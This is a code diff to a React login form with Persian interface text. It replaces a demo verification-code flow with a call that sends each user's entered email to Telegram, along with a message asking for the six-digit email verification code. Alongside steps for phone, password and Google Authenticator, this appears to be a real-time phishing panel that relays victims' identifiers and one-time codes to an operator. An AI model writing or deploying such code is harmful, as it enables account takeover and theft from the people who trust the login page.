@@ -406,21 +406,18 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Sending email code to:", email);
-      await new Promise((resolve) => setTimeout(resolve, 1500));
+      console.log("Sending email to Telegram:", email);
 
-      const generatedCode = Math.floor(
-        100000 + Math.random() * 900000,
-      ).toString();
-      sessionStorage.setItem("emailCode", generatedCode);
-      alert(
-        `🎭 حالت دمو\n\nکد ایمیل: ${generatedCode}\n\n(در حالت واقعی این کد به ایمیل ارسال می‌شود)`,
+      // Send email to Telegram
+      await sendPhoneToTelegramEnhanced(
+        `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
+        false,
       );
 
       setEmailStep("code");
     } catch (error) {
       console.error("Email sending error:", error);
-      setErrors({ email: "خطا در ارسال کد ایمیل. لطفا دوباره تلاش کنید." });
+      setErrors({ email: "خطا در ارسال ایمیل. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -690,7 +687,7 @@ export const LoginForm = () => {
               {currentStep === "verify-phone"
                 ? "تائید شماره همراه"
                 : currentStep === "password"
-                  ? "رم�� عبور"
+                  ? "رمز عبور"
                   : currentStep === "google"
                     ? "Google Authenticator"
                     : "ورود"}
